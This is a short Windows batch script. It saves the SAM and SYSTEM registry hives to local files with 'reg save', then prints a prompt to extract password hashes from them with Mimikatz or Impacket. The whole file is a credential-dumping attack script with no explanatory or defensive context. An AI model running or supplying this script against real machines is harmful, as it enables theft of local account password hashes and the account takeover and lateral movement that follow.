@echo off
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
echo Use Mimikatz or Impacket to extract hashes from sam.save/system.save